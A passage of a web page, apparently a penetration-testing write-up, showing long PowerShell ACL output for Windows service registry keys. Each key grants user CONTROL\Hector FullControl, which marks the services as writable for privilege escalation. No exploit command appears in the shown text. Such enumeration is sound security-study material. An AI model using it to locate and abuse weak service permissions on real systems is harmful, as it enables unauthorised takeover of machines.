Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UdeCx</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UdeCx</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\udfs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\udfs</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UEFI</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UEFI</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UevAgentDriver</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UevAgentDriver</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UevAgentService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UevAgentService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Ufx01000</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Ufx01000</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UfxChipidea</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UfxChipidea</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ufxsynopsys</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ufxsynopsys</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UGatherer</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UGatherer</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UGTHRSVC</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UGTHRSVC</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\umbus</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\umbus</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UmPass</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UmPass</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UmRdpService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UmRdpService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UnistoreSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UnistoreSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UnistoreSvc_42246</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UnistoreSvc_42246</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UnistoreSvc_4248c</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UnistoreSvc_4248c</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UnistoreSvc_80d08</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UnistoreSvc_80d08</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UnistoreSvc_ee306</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UnistoreSvc_ee306</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\upnphost</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\upnphost</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UrsChipidea</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UrsChipidea</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UrsCx01000</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UrsCx01000</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UrsSynopsys</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UrsSynopsys</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbccgp</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbccgp</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbehci</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbehci</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbhub</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbhub</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\USBHUB3</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\USBHUB3</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbohci</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbohci</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbprint</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbprint</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbser</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbser</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\USBSTOR</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\USBSTOR</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbuhci</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbuhci</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbvideo</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\usbvideo</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\USBXHCI</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\USBXHCI</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UserDataSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UserDataSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UserDataSvc_42246</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UserDataSvc_42246</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UserDataSvc_4248c</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UserDataSvc_4248c</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UserDataSvc_80d08</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UserDataSvc_80d08</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UserDataSvc_ee306</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UserDataSvc_ee306</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UserManager</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UserManager</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UsoSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\UsoSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VaultSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VaultSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vdrvroot</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vdrvroot</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vds</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vds</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VerifierExt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VerifierExt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VGAuthService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VGAuthService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vhdmp</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vhdmp</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vhf</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vhf</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vm3dmp</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vm3dmp</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vm3dmp-debug</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vm3dmp-debug</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vm3dmp-stats</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vm3dmp-stats</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vm3dmp_loader</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vm3dmp_loader</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmbus</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmbus</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VMBusHID</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VMBusHID</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmci</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmci</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmgid</span><br><span class="line">PSParentPath            : 